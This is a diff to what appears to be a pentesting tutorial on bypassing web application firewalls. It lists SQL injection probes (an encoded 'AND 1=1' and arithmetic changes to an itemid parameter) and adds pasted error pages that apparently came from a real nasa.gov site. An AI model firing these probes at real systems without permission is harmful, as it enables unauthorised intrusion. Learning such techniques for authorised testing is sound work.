@@ -469,10 +469,13 @@ This is where real pentesting starts: WAF Bypass
 3. Encoded payload
    
 10088%20AND%201=1
+<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>
 
 4. Use arithmetic instead (very smart)
    
 itemid=10088+1
+<html><body><h2>Error!</h2><p>This application has encountered an error.  Contact <a   href="mailto:support@cce.nasa.gov">website support</a> for assistance.</a>
+
 itemid=10088-1
 itemid=10088*1
 
